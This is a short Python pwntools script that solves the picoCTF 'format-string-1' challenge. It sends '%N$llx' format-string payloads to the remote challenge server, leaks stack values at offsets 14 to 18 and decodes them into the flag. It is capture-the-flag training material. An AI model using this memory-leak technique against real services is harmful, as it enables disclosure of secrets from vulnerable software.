import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./format-string-1')
#io = elf.process()
fullFlag = "";
for x in range(0,5):
    io = pwn.remote('mimas.picoctf.net',57109)
    io.recv(1000)
    index = 14+x
    payload = "%"+str(index)+"$llx"
    io.sendline(payload)
    io.recvuntil("r: ")
    flag = io.recvuntil('\n')
    flag = flag.decode("ASCII")
    currentPart = ""
    for i in range(0,len(flag)-1,2):
        currentChar = flag[i] + flag[i+1]
        currentChar = int(currentChar, 16)
        currentChar = chr(currentChar)
        currentPart= currentChar + currentPart 
    io.close()
    fullFlag = fullFlag + currentPart
print(fullFlag)
